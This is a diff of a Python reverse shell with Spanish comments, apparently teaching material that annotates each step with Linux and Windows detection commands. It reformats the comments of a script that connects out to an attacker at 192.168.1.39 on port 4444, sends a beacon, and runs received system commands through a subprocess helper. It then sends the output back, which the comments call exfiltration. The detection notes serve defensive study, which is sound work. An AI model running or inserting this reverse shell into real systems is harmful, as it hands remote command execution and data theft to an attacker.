@@ -6,23 +6,19 @@
 # COMPATIBILIDAD: Windows + Linux
 # =============================================================================
 
-# ┌─────────────────────────────────────────────────────────────────────────┐
-# │ IMPORTACIÓN DE LIBRERÍAS                                                │
-# └─────────────────────────────────────────────────────────────────────────┘
-import socket, subprocess, sys
 
+import socket, subprocess, sys # │ IMPORTACIÓN DE LIBRERÍAS
     # socket     → Comunicaciones de red
     # subprocess → Ejecutar comandos del sistema
     # sys        → Detección de sistema operativo
-    #
+    
     # 🛡️ DETECCIÓN: python + subprocess = ALERTA INMEDIATA
     # 🛡️ MANJARO: sudo ausearch -c python3
-    # 🛡️ WINDOWS: Get-EventLog -LogName Application | Where-Object {$_.Message -like "*Python*"}
+    # 🛡️ WINDOWS: Get-EventLog -LogName Application | Where-Object {$_.Message -like "*Python*"
 
-# ┌─────────────────────────────────────────────────────────────────────────┐
-# │ FUNCIÓN DE EJECUCIÓN DE COMANDOS - COMPATIBLE WINDOWS/LINUX             │
-# └─────────────────────────────────────────────────────────────────────────┘
-def ejecutarComando(command):
+
+
+def ejecutarComando(command): # │ FUNCIÓN DE EJECUCIÓN DE COMANDOS - COMPATIBLE WINDOWS/LINUX
 
     command_str = command.decode('utf-8', errors='ignore')
 
@@ -38,11 +34,7 @@ def ejecutarComando(command):
         
         # Decodificar bytes a string (necesario en Windows)    
 
-# ┌─────────────────────────────────────────────────────────────────────────┐
-# │ CREACIÓN DEL SOCKET                                                     │
-# └─────────────────────────────────────────────────────────────────────────┘
-
-connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # │ CREACIÓN DEL SOCKET
 
     # socket.socket() → Crea endpoint de red
     # AF_INET         → IPv4
@@ -51,25 +43,17 @@ connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     # 🛡️ DETECCIÓN: sudo lsof -i -P -n | grep python (Linux)
     # 🛡️ DETECCIÓN: netstat -ano | findstr "python" (Windows)
 
-# ┌─────────────────────────────────────────────────────────────────────────┐
-# │ CONEXIÓN SALIENTE - PUNTO DE DETECCIÓN #1 ⚠️                            │
-# └─────────────────────────────────────────────────────────────────────────┘
-
-connection.connect(("192.168.1.39", 4444))
+connection.connect(("192.168.1.39", 4444)) # │ CONEXIÓN SALIENTE - PUNTO DE DETECCIÓN #1 ⚠️
 
     # connect()       → Conecta al atacante
     # 192.168.1.39    → IP del atacante
     # 4444            → Puerto del atacante
-    #
+
     # 🛡️ DETECCIÓN #1: Conexión SALIENTE a puerto 4444
     # 🛡️ MANJARO: sudo ss -antp | grep 4444
     # 🛡️ WINDOWS: netstat -ano | findstr "4444"
 
-# ┌─────────────────────────────────────────────────────────────────────────┐
-# │ ENVÍO DE BEACON - PUNTO DE DETECCIÓN #2 ⚠️                              │
-# └─────────────────────────────────────────────────────────────────────────┘
-
-connection.send(" \n [+]Conexion Exitosamente Establecida \n".encode('utf-8'))
+connection.send(" \n [+]Conexion Exitosamente Establecida \n".encode('utf-8')) # │ ENVÍO DE BEACON - PUNTO DE DETECCIÓN #2 ⚠️ 
 
     # send()          → Envía beacon al atacante
     # encode('utf-8') → Convierte string a bytes
@@ -78,30 +62,20 @@ connection.send(" \n [+]Conexion Exitosamente Establecida \n".encode('utf-8'))
     # 🛡️ MANJARO: sudo tcpdump -i any port 4444 -X
     # 🛡️ WINDOWS: Wireshark tcp.port == 4444
 
-# ┌─────────────────────────────────────────────────────────────────────────┐
-# │ BUCLE PRINCIPAL - ESPERA DE COMANDOS                                    │
-# └─────────────────────────────────────────────────────────────────────────┘
+while True: # │ BUCLE PRINCIPAL - ESPERA DE COMANDOS
+    
+    command = connection.recv(1024) # │ RECEPCIÓN DE COMANDOS - PUNTO DE DETECCIÓN #3 
 
-while True:
-    
-    # ┌─────────────────────────────────────────────────────────────────────┐
-    # │ RECEPCIÓN DE COMANDOS - PUNTO DE DETECCIÓN #3                       │
-    # └─────────────────────────────────────────────────────────────────────┘
-    
-    command = connection.recv(1024)
-    
         # recv(1024) → Recibe comandos del atacante (bytes)
-        #
+        
         # 🛡️ DETECCIÓN #3: Tráfico entrante
         # 🛡️ MANJARO: sudo tcpdump -i any port 4444 -n -v
         # 🛡️ WINDOWS: netstat -ano | findstr "ESTABLISHED"
-        
-    # ┌─────────────────────────────────────────────────────────────────────┐
-    # │ EJECUCIÓN DE COMANDO - PUNTO DE DETECCIÓN #4 ⚠️                     │
-    # └─────────────────────────────────────────────────────────────────────┘
-    
-    try:
+
+    try: # │ EJECUCIÓN DE COMANDO - PUNTO DE DETECCIÓN #4 ⚠️ 
+
         resultadosComando = ejecutarComando(command)
+
     except Exception as e:
         # Si hay error, enviar mensaje de error al atacante
         resultadosComando = str(e).encode('utf-8')
@@ -112,21 +86,13 @@ while True:
             # 🛡️ DETECCIÓN #4: python → cmd/bash (EL MAYOR IoC)
             # 🛡️ MANJARO: sudo ausearch -c python3 --start recent
             # 🛡️ WINDOWS: Get-EventLog -LogName Security | Where-Object {$_.EventID -eq 4688}
-    
-    # ┌─────────────────────────────────────────────────────────────────────┐
-    # │ ENVÍO DE RESULTADOS - EXFILTRACIÓN ⚠️                               │
-    # └─────────────────────────────────────────────────────────────────────┘
-    
-    connection.send(resultadosComando)
-    
+ 
+    connection.send(resultadosComando) # │ ENVÍO DE RESULTADOS - EXFILTRACIÓN ⚠️      
+
         # send() → Envía resultados (exfiltración)
-        #
+
         # 🛡️ DETECCIÓN #5: Datos salientes sensibles
         # 🛡️ MANJARO: sudo tcpdump -i any port 4444 -w exfil.pcap
         # 🛡️ WINDOWS: Wireshark tcp.port == 4444
 
-# ┌─────────────────────────────────────────────────────────────────────────┐
-# │ CIERRE DE CONEXIÓN - NUNCA SE EJECUTA ⚠️                                │
-# └─────────────────────────────────────────────────────────────────────────┘
-
-# connection.close()  ← Fuera del while, nunca se ejecuta
+connection.close() # │ CIERRE DE CONEXIÓN - NUNCA SE EJECUTA ⚠️     
